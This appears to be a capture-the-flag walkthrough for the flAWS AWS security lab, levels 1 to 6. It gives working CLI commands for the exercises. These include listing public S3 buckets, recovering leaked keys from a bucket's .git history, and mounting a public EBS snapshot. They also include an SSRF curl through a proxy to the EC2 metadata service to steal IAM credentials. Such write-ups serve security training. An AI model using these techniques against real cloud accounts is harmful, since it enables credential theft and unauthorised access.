# flAWS

http://flaws.cloud/

## Level 1

```shell
# Let's recon the domain name
dig +short flaws.cloud
nslookup 52.218.168.242
# Doing a reverse lookup for one of the IP points us to s3-website-us-west-2.amazonaws.com
# so we know it's hosted in S3 in the us-west-2 region.
aws s3 ls s3://flaws.cloud/ --no-sign-request
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html .
```

## Level 2

```shell
# After having logged in to an AWS account I own:
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html .
```

## Shell 3

```shell
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --no-sign-request
# The bucket contains a `.git` folder:
aws s3 cp --recursive s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/ ./git/ --no-sign-request
cd ./git
git log
# The history shows a secret was leaked in the first commit before being removed
git diff f52ec03b227ea6094b04e43f475fb0126edb5a61..b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
# Let's login with the leaked credentials
export AWS_ACCESS_KEY_ID=[...]
export AWS_SECRET_ACCESS_KEY=[...]
# We can now list all buckets for the account
aws s3api list-buckets
```

## Level 4

```shell
aws sts get-caller-identity
aws ec2 describe-snapshots --owner-ids 975426262029 --region us-west-2
# The snapshot is public so let's create a volume based on it in an AWS account under our control
aws ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89
# Create an EC2 with the volume attached and SSH to it
cat /home/ubuntu/setupNginx.sh
# Credentials can then be used to login to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/
```

## Level 5

```shell
# The EC2 proxy features can be abused to talk to the EC2 metadata instance and exfiltrate credentials
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
export AWS_ACCESS_KEY_ID=[...]
export AWS_SECRET_ACCESS_KEY=[...]
export AWS_SESSION_TOKEN=[...]
aws sts get-caller-identity
aws s3api list-buckets
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
```

## Level 6

```shell
# Login with the provided credentials
export AWS_ACCESS_KEY_ID=[...]
export AWS_SECRET_ACCESS_KEY=[...]
aws sts get-caller-identity
# List IAM policies attached to the user
aws iam list-user-policies --user-name Level6
aws iam list-attached-user-policies --user-name Level6
aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
# API gateways are often backed by Lambdas so let's have a look!
aws --region us-west-2 lambda list-functions
aws --region us-west-2 lambda get-policy --function-name Level6
aws --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"
# Crafting the Lambda invokation URL
open https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
```
